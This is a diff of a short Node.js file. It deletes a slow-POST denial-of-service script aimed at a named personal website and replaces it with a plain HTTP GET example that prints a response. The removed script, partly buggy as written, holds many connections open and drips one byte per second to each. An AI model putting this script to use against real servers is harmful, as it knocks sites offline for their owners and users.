@@ -1,49 +1,24 @@
 var http = require('http');
-
-var url = 'www.kimalvarez.me';
-
-var maxConnections = 125,
-	length = 10000;
-
 var options = {
-	'port': 80,
-	'host': url,
-	'Content-Length': length
-}
+	host: 'www.google.com',
+	path: '/index.html'
+};
 
-var connections = [];
-for (var i = 0; i < maxConnections; i++) {
-	var obj = {}
-		var request = http.request({
-			'port': 80,
-			'host': url,
-			'method': 'POST',
-			'Content-length': length
-		});
-	
-	connections.push(request);
-}
-
-var next = function(cnt) {
-	for (var i = 0; i < maxConnections; i++) {
-	//request.write('a');
-	connections[i].req.write('a');
-	}
-	
-	console.log(cnt);
-	cnt++;
-
-	var x = setTimeout(function() {
-		next(cnt);
-	}, 1000);
-
-	if (cnt > length) {
-		clearInterval(x);
-
-        	for(var i=0; i<max_connections; i++){
-            		connections[i].req.end();
-        	}
-	}
-}
-
-next(1);
+var req = http.get(options, function(res) {
+	console.log('STATUS: ' + res.statusCode);
+	console.log('HEADERS: ' + JSON.stringify(res.headers));
+		
+	// Buffer the body entirely for processing as a whole.
+	var bodyChunks = [];
+	res.on('data', function(chunk) {
+	// You can process streamed parts here...
+		 bodyChunks.push(chunk);
+	}).on('end', function() {
+		var body = Buffer.concat(bodyChunks);
+		console.log('BODY: ' + body);
+	// ...and/or process the entire body here.
+		})
+	});
+	req.on('error', function(e) {
+		console.log('ERROR: ' + e.message);
+});
